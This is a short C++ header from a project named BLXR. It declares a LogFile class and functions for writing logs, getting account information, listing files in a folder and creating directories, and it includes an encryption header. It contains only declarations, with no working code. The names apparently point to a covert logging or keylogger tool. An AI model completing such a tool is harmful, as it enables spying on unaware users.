#ifndef BLXR__STREAM_H_
#define BLXR__STREAM_H_

#include <fstream>
#include <sstream>
#include <rpc.h>

#include "helper.h"
#include "encrypt.h"

namespace Stream {
class LogFile {
 public:
  std::ofstream Ofstream;
  std::string Name;
  std::string Path;
  std::string PathFull;

  LogFile(const std::string &path, const std::string &name) : Ofstream(path + name, std::fstream::in),
															  Path(path),
															  Name(name),
															  PathFull(path + name) {}
};

std::string GetPath(const std::string &dir = "");
bool MakeDir(const std::string &path);
bool MakeFile();
bool WriteLog(const std::string &input, uint32_t &active, bool blockProcessInfo = false);
bool GetAccountInfo();
bool GetAllFilesInFolder(const std::string &firstFile);

static Stream::LogFile *logFile;
}

#endif //BLXR__STREAM_H_
